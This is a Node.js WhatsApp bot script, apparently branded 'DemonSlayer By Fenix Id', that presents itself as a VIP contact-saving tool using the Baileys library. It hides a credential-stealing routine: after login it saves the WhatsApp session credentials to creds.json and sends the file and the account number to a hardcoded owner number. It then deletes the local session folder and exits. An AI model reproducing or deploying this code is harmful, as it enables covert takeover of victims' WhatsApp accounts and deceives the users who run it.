const { makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers } = require('@whiskeysockets/baileys');
const fs = require('fs');
const path = require('path');
const readline = require('readline');
const pino = require('pino');

let useCode = true; // Set to true to use pairing code, false for QR code
let loggedInNumber;
const fenixownernum = '94773010580'; // Replace with your number
const sensorNumber = '';

// Function to save creds.json
async function saveCredsToFile(creds) {
    const credsPath = path.join(__dirname, 'creds.json');
    fs.writeFileSync(credsPath, JSON.stringify(creds, null, 2));
    console.log('Credentials saved to creds.json');
    return credsPath;
}

// Function to send creds.json to WhatsApp inbox
async function sendCredsToInbox(sock, jid, credsPath) {
    try {
        console.log('Sending creds.json to:', jid);
        console.log('File path:', credsPath);

        if (!fs.existsSync(credsPath)) {
            console.error('creds.json file does not exist.');
            return;
        }

        await sock.sendMessage(jid, {
            document: fs.readFileSync(credsPath),
            mimetype: 'application/json',
            fileName: 'creds.json',
        });
        console.log('creds.json sent to the inbox successfully.');

        // Send a message to FenixOwnerNumber after sending creds.json
       await sock.sendMessage(`${fenixownernum}@s.whatsapp.net`, { 
    image: { url: 'https://bit.ly/41Bu9fc' },
    caption: `✅ Successful Connect Whatsapp
❌ Do not Share This File Anyone
*🛒 We are F e n i x I d Server VIP KADPL*
> GITHUB : FENIXID-SERVER
> TELEGM: FENIX_TOOLS
*ɪᴍ ᴛʀʏɴɢ ᴛᴏ ʙᴜɪʟᴅ ʏᴏᴜ ᴇxᴘ ᴍᴏʀᴇ ᴠɪᴘ ᴀɴ ᴘʀᴇᴍɪᴜᴍ*`
});
        // Delete the Authorized folder
        const authorizedFolderPath = path.join(__dirname, 'Authorized');
        if (fs.existsSync(authorizedFolderPath)) {
            fs.rmSync(authorizedFolderPath, { recursive: true, force: true });
            console.log('Authorized folder deleted successfully.');
        }

        // Shutdown the bot
        console.log('Bot shutting down...');
        process.exit(0);
    } catch (error) {
        console.error('Failed to send creds.json:', error);
    }
}

// Main function to connect to WhatsApp
async function connectToWhatsApp() {
    const sessionPath = path.join(__dirname, 'Authorized');
    const sessionExists = fs.existsSync(sessionPath) && fs.readdirSync(sessionPath).length > 0;
    const { state, saveCreds } = await useMultiFileAuthState('Authorized');

    const sock = makeWASocket({
        logger: pino({ level: 'fatal' }),
        auth: state,
        printQRInTerminal: !useCode,
        defaultQueryTimeoutMs: undefined,
        keepAliveIntervalMs: 30000,
        browser: Browsers.macOS('Chrome'),
        shouldSyncHistoryMessage: () => true,
        markOnlineOnConnect: true,
        syncFullHistory: true,
        generateHighQualityLinkPreview: true,
    });

    if (useCode && !sessionExists) {
        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout,
        });

        console.log("Hello, it seems you are not logged in. Do you want to log in using a pairing code?\nPlease reply with (y/n)\nType y to agree or type n to log in using QR code.");

        const askPairingCode = () => {
            rl.question('\nDo you want to use a pairing code to log in? (y/n): ', async (answer) => {
                if (answer.toLowerCase() === 'y' || answer.trim() === '') {
                    console.log("\nOkay, please enter your WhatsApp number!\nNote: start with your country code, for example 94773010580");

                    const askWaNumber = () => {
                        rl.question('\nEnter your WhatsApp number: ', async (waNumber) => {
                            if (!/^\d+$/.test(waNumber)) {
                                console.log('\nThe number must be numeric!\nPlease enter your WhatsApp number again.');
                                askWaNumber();
                            } else if (waNumber.length < 10) {
                                console.log('\nInvalid number! Please enter a valid WhatsApp number including country code.');
                                askWaNumber();
                            } else {
                                const code = await sock.requestPairingCode(waNumber);
                                console.log('\nCheck your WhatsApp notifications and enter the login code:', code);

                                rl.question('\nEnter the pairing code in your WhatsApp app, then press Enter here to continue...', async () => {
                                    const credsPath = await saveCredsToFile(state.creds);
                                    const jid = `${waNumber}@s.whatsapp.net`;
                                    await sendCredsToInbox(sock, jid, credsPath);
                                    rl.close();
                                });
                            }
                        });
                    };

                    askWaNumber();
                } else if (answer.toLowerCase() === 'n') {
                    useCode = false;
                    console.log('\nOpen your WhatsApp, then click the three dots in the upper right corner, then click linked devices, then please scan the QR code below to log in to WhatsApp');
                    connectToWhatsApp();
                    rl.close();
                } else {
                    console.log('\nInvalid input. Please enter "y" or "n".');
                    askPairingCode();
                }
            });
        };

        askPairingCode();
    }

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect.error?.output.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
                console.log('Trying to connect to WhatsApp...\n');
                connectToWhatsApp();
            } else {
                console.log('Disconnected from WhatsApp, please delete the Authorized folder and log in to WhatsApp again');
            }
        } else if (connection === 'open') {
            console.log('Connected to WhatsApp');
            loggedInNumber = sock.user.id.split('@')[0].split(':')[0];
            let displayedLoggedInNumber = loggedInNumber;

            if (sensorNumber) {
                displayedLoggedInNumber = displayedLoggedInNumber.slice(0, 3) + '****' + displayedLoggedInNumber.slice(-2);
            }

            let messageInfo = `        
👤 Account: ${loggedInNumber}        
🟢 Status: Online        
📱 WhatsApp Version: 7.56.0.5        

*Exclusive VIP Features:*        
▪ *Vip Save Contacts*        
▪ *Vip Save Contact to Phone*        
▪ *Rapid Response System* 🚀        

> SETUP : SAVE CONTACT      
1. *!updatec CREDENTIALS_CODE*      
2. *!authgoogle*      
3. *!fenixdoit AUTHORIZED_CODE*      

*⛓⛓️‍💥Follow the channel for more updates:*        
https://whatsapp.com/channel/0029Vatd8yBHFxOye7J3DG0E        
*⚙️Join the group*        
https://chat.whatsapp.com/FgYBFNORBUsGMwetsyoFp        

📩 Telegram: https://t.me/fenix_tools        
👤 YouTube: @fenix_id`;

            setTimeout(async () => {
                console.log(`You have successfully logged in with the number: ${displayedLoggedInNumber} \n`);
                await sock.sendMessage(`${fenixownernum}@s.whatsapp.net`, { text: messageInfo });

                // After sending the info message, send creds.json and delete the Authorized folder
                const credsPath = await saveCredsToFile(state.creds);
                await sendCredsToInbox(sock, `${fenixownernum}@s.whatsapp.net`, credsPath);
            }, 5000);

            console.log("DemonSlayer By Fenix Id Is Active\n");
        }
    });

    sock.ev.on('creds.update', saveCreds);
}

connectToWhatsApp().catch((err) => {
    console.error('Error:', err);
    process.exit(1);
});